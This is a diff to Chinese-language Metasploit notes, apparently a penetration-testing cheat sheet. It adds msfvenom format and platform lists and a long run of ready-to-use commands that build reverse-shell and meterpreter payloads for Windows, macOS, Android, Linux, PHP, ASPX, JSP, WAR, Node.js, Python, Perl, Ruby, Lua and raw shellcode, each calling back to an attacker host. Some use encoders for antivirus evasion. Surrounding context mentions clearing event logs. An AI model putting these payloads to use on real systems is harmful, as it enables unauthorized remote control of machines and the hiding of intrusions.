@@ -158,6 +158,8 @@ run -执行当前所配置的指令
 
 -f 
 	指定输出格式(计算机可执行格式)
+	Executable formats:Asp、aspx、aspx-exe、axis2、dll、elf、elf-so、exe、exe-only、exe-service、exe-smallhta-psh、jar、jsp、loop-vbs、macho、		msi、msi-nouac、osx-app、psh、psh-cmd、psh-net、psh-reflection、python-reflection、vba、vba-exe、vba-psh、vbs、war；
+	Transform formats:base32、base64、bash、c、csharp、dw、dword、hex、java、js_be、js_le、num、perl、pl、powershell、ps1、py、python、raw、rb、		ruby、sh、vbapplication、vbscript；
 
 -e
 	指定需要使用的encoder(编码器)编码免杀
@@ -165,6 +167,7 @@ run -执行当前所配置的指令
 -a 
 	指定payload的目标架构
 	选择架构平台:x86|64|x86_64
+	Platforms:windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe
 	
 -o
 	保存payload文件输出
@@ -230,6 +233,120 @@ exploit/windows/local/ask模块（该模块在windows 32位和64位下都有效�
 
 # 痕迹清理(需使用system权限)  --> 在靶机上输入eventvwr即可查看安全日志
 clearev
+
+
+# 各平台生成payload命令
+
+---
+
+Windows
+
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp
+
+LHOST=192.168.3.33 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 10  -f exe -o payload.exe
+
+---
+
+Mac
+
+msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.33 LPORT=4444 -f macho -o payload.macho
+
+---
+
+Android
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567  -o payload.apk
+
+
+
+---
+
+Powershell
+
+msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.1.1 LPORT=8888 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1
+
+---
+
+Linux
+
+msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f elf -o payload.elf
+
+---
+
+php
+
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.1  LPORT=8888  -f raw > shell.php
+
+
+
+---
+
+aspx
+
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8888 -f aspx -o payload.aspx
+
+---
+
+JSP
+
+msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.jsp
+
+---
+
+war
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw - o payload.war
+
+---
+
+nodejs
+
+msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.js
+
+---
+
+python
+
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.py
+
+---
+
+perl
+
+msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.pl
+
+---
+
+ruby
+
+msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.rb
+
+---
+
+lua
+
+msfvenom -p cmd/unix/reverse_lua LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.lua
+
+---
+
+windows shellcode
+
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c
+
+---
+
+linux shellcode
+
+msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c
+
+---
+
+mac shellcode
+
+msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp  LHOST=192.168.1.1  LPORT=4567 -f c
+
+---
+
 
 
 ```
